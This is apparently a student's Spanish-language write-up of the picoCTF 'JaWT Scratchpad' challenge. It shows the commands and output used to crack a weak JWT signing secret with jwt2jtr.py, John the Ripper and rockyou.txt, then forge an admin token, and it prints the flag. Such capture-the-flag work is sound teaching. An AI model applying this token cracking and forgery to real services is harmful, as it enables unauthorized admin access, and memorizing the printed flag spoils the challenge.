# JaWT Scratchpad

---
## Objectivo
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210

---
## Solución
``` bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiamhvbiJ9.lr8H-UFIddII1j9EDm-UsxlnteU-jZhShY2heQnMrq0

angel@angelMnt:~/Documentos/ClasesUAZ/SRYS/S2/tmp/jwt2jtr$ python jwt2jtr.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiamhvbiJ9.lr8H-UFIddII1j9EDm-UsxlnteU-jZhShY2heQnMrq0 > code.hash
angel@angelMnt:~/Documentos/ClasesUAZ/SRYS/S2/tmp/jwt2jtr$ 
john code.hash --wordlist=/home/angel/Descargas/rockyou.txt

ilovepico

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s

picoCTF{jawt_was_just_what_you_thought_44c752f5}


```

### `picoCTF{jawt_was_just_what_you_thought_44c752f5}`

---
## Notas adicionales

JSON Web Token
Es un estándar abierto basado en JSON propuesto por IETF (RFC 7519) para la creación de tokens de acceso que permiten la propagación de identidad y privilegios 

python jwt2jtr.py  -- Genera un código hash que pude ser utilizado con jhon

Después de obtener la clave secreta, podemos usarla para firmar un token e intentar obtener acceso como administrador.

-En la pagína se cambia el usuario a "admin" y se agrega la contrasña "ilovepico"


---
## Referencias

https://jwt.io/

https://infosecwriteups.com/jawt-scratchpad-picoctf-93766d81fd8e